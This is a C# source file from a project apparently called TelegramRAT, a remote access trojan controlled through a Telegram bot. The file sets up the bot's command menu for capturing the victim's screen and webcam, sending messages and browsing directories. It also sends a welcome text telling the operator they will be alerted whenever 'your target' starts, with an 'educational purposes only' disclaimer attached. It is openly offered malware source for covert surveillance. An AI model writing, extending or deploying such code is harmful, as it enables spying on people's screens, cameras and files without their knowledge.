using Telegram.Bot;

namespace TelegramRAT.Commands;

public static class BotCommandExtensions
{
    public static async Task ExecuteStartAsync(this BotCommand cmd, BotCommandModel model, ITelegramBotClient bot)
    {
        var botCommands = new List<Telegram.Bot.Types.BotCommand>
        {
            new() { Command = "screenshot", Description = " 🖼 Capture screen" },
            new() { Command = "webcam", Description = "📷 Capture webcam" },
            new() { Command = "message", Description = "✉️ Send message" },
            new() { Command = "cd", Description = "🗃 Change directory" },
            new() { Command = "dir", Description = "🗂 Current directory content" },
            new() { Command = "help", Description = "ℹ️ See description of command" },
            new() { Command = "commands", Description = "📃 List of all commands" }
        };
        var welcomeMessage = "Welcome, since you see this message, you've done everything well. Now you will receive a message every time your target starts. I kindly remind you, that this software was written in educational purposes only, don't use it for bothering or trolling people pls.\nUse /help and /command to learn this bot functionality";
        await bot.SendMessage(model.Message.Chat.Id, welcomeMessage);
        await bot.SetMyCommands(botCommands);
    }
}